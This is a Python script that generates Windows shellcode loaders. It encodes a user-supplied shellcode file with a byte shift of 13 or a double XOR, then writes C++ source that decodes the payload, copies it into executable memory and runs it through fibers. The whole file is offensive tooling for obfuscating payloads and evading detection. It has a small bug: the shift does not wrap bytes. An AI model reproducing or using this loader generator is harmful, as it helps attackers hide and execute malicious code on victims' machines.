#!/usr/bin/python

import sys
import os
from termcolor import colored

def rot_compailed(shellcode_size, shellcode):
    load = '''
    #include <windows.h>

    int main()
    {
        
        
        PVOID mainFiber = ConvertThreadToFiber(NULL);
    
        unsigned char shellcode[] ;
        
        for (int i = 0; i < sizeof shellcode; i++)
        {
            shellcode[i] = shellcode[i] - 13;
        }
        PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(shellcodeLocation, shellcode, sizeof shellcode);
    
        
        PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);
        
       
        SwitchToFiber(shellcodeFiber);
    
        return 0;
    }
    '''

    loads = load.replace('shellcode[]', shellcode, 1)
    with open('/root/shellcode.cpp', 'w+') as f:
        f.write(loads)


def xor_compailed(shellcode_size, shellcode):
    load = '''
    #include <windows.h>

    int main()
    {
        
        
        PVOID mainFiber = ConvertThreadToFiber(NULL);
    
        unsigned char shellcode[] ;
        
          for (int i = 0; i < sizeof shellcode; i++)
            {
                shellcode[i] = shellcode[i] ^ 0x11 ^ 0x55;
            }
            
        
        
        PVOID shellcodeLocation = VirtualAlloc(0, sizeof shellcode, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
        memcpy(shellcodeLocation, shellcode, sizeof shellcode);
    
        
        PVOID shellcodeFiber = CreateFiber(NULL, (LPFIBER_START_ROUTINE)shellcodeLocation, NULL);
        
       
        SwitchToFiber(shellcodeFiber);
    
        return 0;
    }
    '''

    loads = load.replace('shellcode[]', shellcode, 1)
    with open('/root/shellcode.cpp', 'w+') as f:
        f.write(loads)

def Fiber_rot_13():
    shellcode_add = input("\033[4mPlease input Shellcode:\033[0m" + colored(" >>", "green"))
    shellcode = ''
    shellcode_size = 0
    try:
        with open(shellcode_add, 'rb') as f:
            while True:
                code = f.read(1)
                if not code:
                    break
                base10 = ord(code) + 0x0D
                code_hex = hex(base10)
                code_hex = code_hex.replace('0x', '')

                if (len(code_hex) == 1):
                    code_hex = '0' + code_hex
                shellcode += r'\x' + code_hex
                shellcode_size += 1
        f.close()
    except Exception as e:
        sys.stderr.writelines(str(e))
    shellcodes = "shellcode[] = \"" + shellcode + "\""
    rot_compailed(shellcode_size, shellcodes)

def Fiber_xor_13():
    shellcode_add = input("\033[4mPlease input Shellcode:\033[0m" + colored(" >>", "green"))
    shellcode = ''
    new_shellcode = ''
    shellcode_size = 0
    try:
        with open(shellcode_add, 'rb') as f:
            while True:
                code = f.read(1)
                if not code:
                    break
                base10 = ord(code) ^ 0x55 ^ 0x11
                code_hex = hex(base10)
                code_hex = code_hex.replace('0x', '')

                if (len(code_hex) == 1):
                    code_hex = '0' + code_hex
                shellcode += r'\x' + code_hex
                shellcode_size += 1
        f.close()
    except Exception as e:
        sys.stderr.writelines(str(e))
    shellcodes = "shellcode[] = \"" + shellcode + "\""
    xor_compailed(shellcode_size, shellcodes)